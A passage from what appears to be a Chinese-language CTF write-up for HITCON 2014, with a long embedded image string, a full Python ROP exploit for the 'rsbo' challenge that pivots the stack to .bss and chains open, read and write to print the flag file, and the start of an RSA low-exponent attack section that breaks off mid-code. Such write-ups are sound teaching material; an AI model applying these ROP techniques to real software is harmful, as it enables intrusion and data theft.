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" alt="">  eip之后还有16bytes可用，考虑到栈不可执行，所以使用ROP方式，依次调用open，read，write来打开读取flag再写出，flag的路径在init函数中已经有了。 这边有两种思路，第一种就利用之后的16byte，因为空间很小，所以一次就调用一个函数，先调用open，之后ret回main。再次输入再次溢出时调用read，之后再次返回main，溢出后调用write 第二种就是先调用read或者read_80_bytes读入到.bss，之后ebp指向.bss进入ROP链 我是使用第二种，exp如下（没有网络通信部分）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python2.7 </span></div><div class="line">\<span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">hitcon2014</div><div class="line">rsbo</div><div class="line">exp</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    junk = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x00000000</span>)  * <span class="number">26</span></div><div class="line">    bss = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804a040</span>)</div><div class="line">    read\_80\_byte = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804865c</span>)</div><div class="line">    leave_ret = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804867d</span>)</div><div class="line">    opep_pid = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x08048420</span>)</div><div class="line">    read_pid = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x080483e0</span>)</div><div class="line">    write_pid = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x08048450</span>)</div><div class="line">    pppr = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804879d</span>)</div><div class="line">    ppr = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804879e</span>)</div><div class="line">    buf = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804a080</span>)</div><div class="line">    read_size = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x10</span>)</div><div class="line">    flag_path = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x080487d0</span>)</div><div class="line">    fd = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x3</span>)</div><div class="line"></div><div class="line">    <span class="comment">#send</span></div><div class="line">    payload1 = <span class="string">''</span></div><div class="line">    payload1 += junk</div><div class="line"></div><div class="line">    <span class="comment">#ebp</span></div><div class="line">    payload1 += bss</div><div class="line"></div><div class="line">    <span class="comment">#call read\_80\_byte</span></div><div class="line">    payload1 += read\_80\_byte</div><div class="line"></div><div class="line">    <span class="comment">#set esp=ebp=.bss</span></div><div class="line">    payload1 += leave_ret</div><div class="line"></div><div class="line">    <span class="comment">#read\_80\_byre arg1</span></div><div class="line">    payload1 += bss </div><div class="line"></div><div class="line">    <span class="comment">#junk</span></div><div class="line">    payload1 += struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x00</span>) *<span class="number">2</span></div><div class="line"></div><div class="line">    <span class="comment">#write to .bss</span></div><div class="line">    payload2 = <span class="string">''</span></div><div class="line"></div><div class="line">    <span class="comment">#ebp</span></div><div class="line">    payload2 += struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x00</span>)</div><div class="line"></div><div class="line">    <span class="comment">#open</span></div><div class="line">    payload2 += opep_pid </div><div class="line"></div><div class="line">    <span class="comment">#ppr</span></div><div class="line">    payload2 += ppr </div><div class="line"></div><div class="line">    <span class="comment">#open arg</span></div><div class="line">    payload2 += flag_path</div><div class="line">    payload2 += struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x00</span>) </div><div class="line"></div><div class="line">    <span class="comment">#read</span></div><div class="line">    payload2 += read_pid</div><div class="line">    <span class="comment">#pppr</span></div><div class="line">    payload2 += pppr</div><div class="line">    <span class="comment">#read arg</span></div><div class="line">    payload2 += fd</div><div class="line">    payload2 += buf</div><div class="line">    payload2 += read_size</div><div class="line"></div><div class="line">    <span class="comment">#write</span></div><div class="line">    payload2 += write_pid</div><div class="line">    <span class="comment">#****</span></div><div class="line">    payload2 += pppr</div><div class="line">    <span class="comment">#write arg</span></div><div class="line">    payload2 += struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x1</span>)</div><div class="line">    payload2 += buf</div><div class="line">    payload2 += read_size</div><div class="line"></div><div class="line">    payload = payload1 + payload2</div><div class="line">    <span class="keyword">print</span> payload</div><div class="line"></div><div class="line"><span class="keyword">if</span> \_\_name\_\_ == <span class="string">'\_\_main\_\_'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h1 id="0x02-rsaha"><a href="#0x02-rsaha" class="headerlink" title="0x02 rsaha"></a>0x02 rsaha</h1><p>这个是利用RSA的低指数攻击 paper<a href="https://www.cs.unc.edu/%7Ereiter/papers/1996/Eurocrypt.pdf" target="_blank" rel="external">https://www.cs.unc.edu/~reiter/papers/1996/Eurocrypt.pdf</a> 用到了sage <a href="http://www.sagemath.org/" target="_blank" rel="external">http://www.sagemath.org/</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div 